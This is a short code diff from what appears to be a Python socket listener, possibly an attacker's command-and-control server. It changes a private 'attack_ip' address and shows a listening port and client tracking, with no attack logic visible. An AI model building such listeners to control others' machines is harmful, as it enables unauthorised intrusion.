@@ -261,7 +261,7 @@ ips = []
 clients = 0
 stop_thread = False
 
-attack_ip = "192.168.0.103"
+attack_ip = "192.168.0.107"
 listen_port = 54321
 
 sock = sc.socket(sc.AF_INET, sc.SOCK_STREAM)
